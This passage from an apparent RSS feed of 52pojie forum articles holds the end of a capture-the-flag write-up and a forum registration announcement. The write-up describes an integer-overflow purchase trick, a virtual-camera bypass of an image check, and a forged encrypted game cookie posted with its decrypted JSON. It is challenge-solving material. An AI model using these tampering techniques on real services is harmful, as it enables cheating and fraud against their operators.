96);">'0b10000000000000000000000000000000000000000000000000000000000011100'</span><br />&gt;&gt;&gt; bin(28)<br /><span style="color: rgb(168, 255, 96);">'0b11100'</span></code></pre><p>直接买18464037713个，扣除28金币，得到答案</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=36a53eff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJSkN8PX6Zft4b1ZkX5r4x1FJ9ooacMwibCMZpXIDbiceO5uleiat5rXfPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="514" /></p><p><br /></p><h2>flagC</h2><p>看页面可以看出是物品识别，要求了数量和位置必须和它的预设一致。</p><p>个人想到的方案：可以根据test.jpg提示的物品内容，把图里的各个元素单独提取出来（比如用QQ截图单独截取然后钉在桌面），然后在桌面上/某个窗口内调整位置/数量，然后利用obs的虚拟摄像头共享桌面，使用摄像头，根据返回的文字提示慢慢调整位置/数量即可解出。</p><p>以下是一个1920*1080的图片位置参考，一共四件</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=3f82062c&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJpOe70u7p5jUKoCF1pmgUl0bAaoR0BmBxX0syqVMdslMIiaO1ExfWUIA%2F640%3Fwx_fmt%3Djpeg%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=e23f13c9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJgzicZqu4TJkUqRPZnkSIia23ohjOfCq5q16tHKiaHG1XwbozXyBrqbNiaA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="790" /></p><p><br /></p><h2>后记</h2><p>flag8 &amp; flagB 中，游戏数据被记录在名为<code style="font-family: SFMono-Regular, Consolas, ;">game2048_user_data</code>的Cookie里，也是加密文字，按照类似flagA的做法也能还原为json，看来这里和uid以及flagA用的是同一种加密方式</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=02bcafce&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJasjf9yCJJriaFyCkrjuzYiaBEbeFuR3icyRvmTlbrJfeT4Uee7VSf9DIg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1037" /></p><p><br /></p><p>不过如果想利用login接口尝试将其变成密文就不行了</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=ecac9385&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJ9T0JCRC3yabjKSicwdVNvJh5iawfteZFD3fzCybGy5icaDxZH1F2EwPhCmRKCCJKTLj3U8Sax4A9jA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="481" /></p><p><br /></p><p>如果这里不做验证，或许可以通过直接改JSON的方式拿到flagB</p><p>这里贴一个能过flag8和flagB的Cookie供参考</p><p><code style="font-family: SFMono-Regular, Consolas, ;">kIc8IGsHes1HrUU8gHkub17LMRmCoc1ECG583Z5eI6mczcYSrozQiobbon+ZAyDyLXKbSkQjTdSEAqCIN2ot7UFlX6PzRZNp6En5A6HeltB2Zz6Wbf8fZnY5PdfopQuR3QeQyj70Q2EbMv42pqwhy40ap3epsmxlJshH6YA0Jl16vfzL80dMsJmlnF2ju7hGXYuSjrcuDGXzyQeICcGqIdcZDe88o7JiEfsf/iQu</code></p><p>解密后：</p><p><code style="font-family: SFMono-Regular, Consolas, ;">{"game_data":{"tiles":[4,8,2,4,16,64,32,8,8,32,16,4,2,0,2,8],"score":692},"money_count":10288,"remove_piece_count":26,"flag_b_count":166176339416}</code></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);"></span></strong></span></strong></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1893062-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Tue, 05 Mar 2024 15:19:27 +0800</pubDate>
<pubDate>Tue, 05 Mar 2024 15:19:27 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140118&amp;idx=1&amp;sn=ebfd649128b56c20a3de756477233ecb&amp;chksm=bd50a0428a27295408280749dc6c261e8a5194b893e1c0a27ace4fe77317a20f7bf9b96c5a43&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140118&amp;idx=1&amp;sn=ebfd649128b56c20a3de756477233ecb&amp;chksm=bd50a0428a27295408280749dc6c261e8a5194b893e1c0a27ace4fe77317a20f7bf9b96c5a43&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
<span>吾爱pojie</span> <span>2024-03-04 17:33</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，送20个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年3月13日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">关</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">随</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">等</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">还</span><span style="display: inline-block; text-indent: initial;">可</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">每</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">签</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">C</span><span style="display: inline-block; text-indent: initial;">B</span><span style="display: inline-block; text-indent: initial;">！</span></span></strong></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">避</span><span style="display: inline-block; text-indent: initial;">免</span><span style="display: inline-block; text-indent: initial;">由</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">负</span><span style="display: inline-block; text-indent: initial;">面</span><span style="display: inline-block; text-indent: initial;">影</span><span style="display: inline-block; text-indent: initial;">响</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">将</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">强</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">对</span><span style="display: inline-block; text-indent: initial;">于</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">现</span><span style="display: inline-block; text-indent: initial;">有</span><span style="display: inline-block; text-indent: initial;">马</span><span style="display: inline-block; text-indent: initial;">甲</span><span style="display: inline-block; text-indent: initial;">或</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">户</span><span style="display: inline-block; text-indent: initial;">从</span><span style="display: inline-block; text-indent: initial;">事</span><span style="display: inline-block; text-indent: initial;">违</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">行</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">情</span><span style="display: inline-block; text-indent: initial;">况</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">会</span><span style="display: inline-block; text-indent: initial;">采</span><span style="display: inline-block; text-indent: initial;">取</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">严</span><span style="display: inline-block; text-indent: initial;">格</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">处</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">措</span><span style="display: inline-block; text-indent: initial;">施</span><span style="display: inline-block; text-indent: initial;">。</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">您</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">前</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">认</span><span style="display: inline-block; text-indent: initial;">真</span><span style="display: inline-block; text-indent: initial;">阅</span><span style="display: inline-block; text-indent: initial;">读</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">须</span><span style="display: inline-block; text-indent: initial;">知</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">及</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">总</span><span style="display: inline-block; text-indent: initial;">版</span><span style="display: inline-block; text-indent: initial;">规</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">便</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">地</span><span style="display: inline-block; text-indent: initial;">适</span><span style="display: inline-block; text-indent: initial;">应</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">享</span><span style="display: inline-block; text-indent: initial;">受</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">社</span><span style="display: inline-block; text-indent: initial;">区</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">具</span><span style="display: inline-block; text-indent: initial;">体</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span><span style="display: inline-block; text-indent: initial;">时</span><span style="display: inline-block; text-indent: initial;">间</span><span style="display: inline-block; text-indent: initial;">如</span><span style="display: inline-block; text-indent: initial;">下</span><span style="display: inline-block; text-indent: initial;">：</span></span><span style="font-size: 14px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">24</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">13</span><span style="display: inline-block; text-indent: initial;">日</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span></span></strong><strong><span style="color: rgb(255, 0, 0);"><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">4</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;">-</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">：</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span></span></strong></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">邀</span><span style="display: inline-block; text-indent: initial;">请</span><span style="display: inline-block; text-indent: initial;">获</span><span style="display: inline-block; text-indent: initial;">得</span><span style="display: inline-block; text-indent: initial;">贡</span><span style="display: 